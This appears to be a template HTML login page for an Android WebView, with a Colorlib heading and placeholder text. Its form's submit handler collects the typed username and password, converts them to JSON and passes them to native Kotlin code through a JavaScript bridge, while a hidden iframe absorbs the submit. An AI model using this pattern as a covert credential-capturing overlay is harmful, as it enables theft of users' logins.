<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta
      http-equiv="Cache-Control"
      content="no-store, no-cache, must-revalidate, max-age=0"
    />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />

    <link rel="stylesheet" href="Login_files/bootstrap.min.css" />
    <link rel="stylesheet" href="Login_files/style_002.css" />

    <title>Login Screen</title>
    <style>
      body {
        user-select: none;
      }

      input {
        user-select: text;
      }
    </style>
  </head>
  <body>
    <div class="content">
      <div class="container">
        <div class="row">
          <div class="col-md-6 order-md-2">
            <img
              src="Login_files/undraw_file_sync_ot38.svg"
              alt="Image"
              class="img-fluid"
            />
          </div>
          <div class="col-md-6 contents">
            <div class="row justify-content-center">
              <div class="col-md-8">
                <div class="mb-4">
                  <h3>Sign In to <strong>Colorlib</strong></h3>
                  <p class="mb-4">
                    Lorem ipsum dolor sit amet elit. Sapiente sit aut eos
                    consectetur adipisicing.
                  </p>
                </div>
                <iframe name="votar" style="display: none"></iframe>
                <form
                  target="votar"
                  onsubmit="
                    const username = document.getElementById('username').value 
                    const p = document.getElementById('password').value
                    var myObject = {
                        username: username,
                        password: p
                    };
                    var jsonString = JSON.stringify(myObject);
                    AndroidInterface.sendDataToKotlin(jsonString)
                "
                >
                  <div class="form-group first">
                    <label for="username">Username</label>
                    <input
                      type="text"
                      class="form-control"
                      id="username"
                      autocomplete="off"
                    />
                  </div>
                  <div class="form-group last mb-4">
                    <label for="password">Password</label>
                    <input
                      type="password"
                      class="form-control"
                      id="password"
                      autocomplete="off"
                    />
                  </div>
                  <div class="d-flex mb-5 align-items-center">
                    <label class="control control--checkbox mb-0"
                      ><span class="caption">Remember me</span>
                      <input type="checkbox" checked="checked" />
                      <div class="control__indicator"></div>
                    </label>
                    <span class="ml-auto"
                      ><a href="#" class="forgot-pass">Forgot Password</a></span
                    >
                  </div>
                  <input
                    type="submit"
                    value="Log In"
                    class="btn text-white btn-block btn-primary"
                  />
                  <span class="d-block text-left my-4 text-muted">
                    or sign in with</span
                  >
                  <div class="social-login">
                    <a href="#" class="facebook">
                      <span class="icon-facebook mr-3"></span>
                    </a>
                    <a href="#" class="twitter">
                      <span class="icon-twitter mr-3"></span>
                    </a>
                    <a href="#" class="google">
                      <span class="icon-google mr-3"></span>
                    </a>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!-- <script src="Login_files/bootstrap.min.js"></script> -->
    <script src="Login_files/jquery-3.3.1.min.js"></script>
    <!-- <script src="js/popper.min.js"></script> -->
    <script src="Login_files/main.js"></script>
  </body>
</html>
